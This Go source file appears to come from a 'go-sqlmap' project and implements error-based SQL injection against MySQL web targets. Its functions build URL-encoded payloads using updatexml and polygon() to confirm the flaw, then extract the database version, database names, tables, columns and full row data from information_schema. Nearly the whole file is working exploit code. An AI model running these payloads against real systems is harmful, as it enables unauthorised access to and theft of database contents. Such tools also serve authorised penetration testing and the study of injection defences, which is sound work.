package core

import (
	"go-sqlmap/constant"
	"go-sqlmap/log"
	"go-sqlmap/util"
	"regexp"
	"strings"
)

// DetectErrorBased 检测是否存在报错注入
func DetectErrorBased(target string, suffixList []string) (bool, string) {
	for _, suffix := range suffixList {
		finalPayload := target + suffix + constant.Space + "Or" + constant.Space +
			constant.UpdatexmlFunc + constant.Space + constant.Annotator
		code, _, tempBody := util.Request(constant.DefaultMethod,
			finalPayload, nil, nil)
		if code != -1 {
			if strings.Contains(strings.ToLower(string(tempBody)),
				strings.ToLower(constant.ErrorBasedKeyword)) {
				return true, suffix
			}
		}
	}
	return false, ""
}

// GetVersionByErrorBased 报错注入方式得到版本
func GetVersionByErrorBased(target string, suffix string) {
	code, _, tempBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.PolygonVersionPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonVersionRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("mysql version:" + res[0][1])
		}
	}
}

// GetCurrentDatabaseByErrorBased 报错注入方式得到当前数据库名
func GetCurrentDatabaseByErrorBased(target string, suffix string) {
	code, _, tempBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.PolygonDatabasePayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonDatabaseRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("current database:" + res[0][1])
		}
	}
}

// GetAllDatabasesByErrorBased 报错注入方式得到所有数据库名
func GetAllDatabasesByErrorBased(target string, suffix string) {
	code, _, tempBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.PolygonAllDatabasesPayload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get databases success")
			util.PrintDatabases(util.ConvertString(res[0][1]))
		}
	}
}

// GetAllTablesByErrorBased 报错注入根据数据库名获得所有表名
func GetAllTablesByErrorBased(target string, suffix string, database string) {
	payload := target + suffix + constant.Space + "Or" + constant.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20" +
		"group_concat(table_name)%20from%20information_schema." +
		"tables%20where%20table_schema='" + database + "')a)b))--+"
	code, _, tempBody := util.Request(constant.DefaultMethod, payload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get databases success")
			util.PrintTables(util.ConvertString(res[0][1]))
		}
	}
}

// GetAllColumnsByErrorBased 报错注入根据数据库名和表名获得所有字段
func GetAllColumnsByErrorBased(target string, suffix string, database string, table string) {
	payload := target + suffix + constant.Space + "Or" + constant.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20" +
		"group_concat(column_name)%20from%20information_schema." +
		"columns%20where%20table_name='" + table +
		"'%20and%20table_schema='" + database + "')a)b))--+"
	code, _, tempBody := util.Request(constant.DefaultMethod, payload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get databases success")
			util.PrintColumns(util.ConvertString(res[0][1]))
		}
	}
}

// GetAllDataByErrorBased 报错注入根据输入获得所有数据
func GetAllDataByErrorBased(target string, suffix string, database string, table string, columns []string) {
	start := target + suffix + constant.Space + "Or" + constant.Space +
		"polygon((select%20*%20from(select%20*%20from(select%20group_concat("
	var tempPayload string
	for _, v := range columns {
		tempPayload = tempPayload + v + ",0x3a,"
	}
	r := []rune(tempPayload)
	result := string(r[:len(r)-6])
	payload := start + result + ")%20from%20" + database + "." + table + ")a)b))--+"
	code, _, tempBody := util.Request(constant.DefaultMethod, payload, nil, nil)
	if code != -1 {
		body := string(tempBody)
		if strings.Contains(strings.ToLower(body),
			strings.ToLower(constant.PolygonErrorKeyword)) {
			re := regexp.MustCompile(constant.PolygonFinalDataRegex)
			res := re.FindAllStringSubmatch(body, -1)
			log.Info("get databases success")
			var output [][]string
			for _, v := range strings.Split(res[0][1], ",") {
				var temp []string
				params := strings.Split(v, ":")
				for _, innerV := range params {
					temp = append(temp, innerV)
				}
				output = append(output, temp)
			}
			util.PrintData(util.ConvertInterfaceArray(columns, output))
		}
	}
}
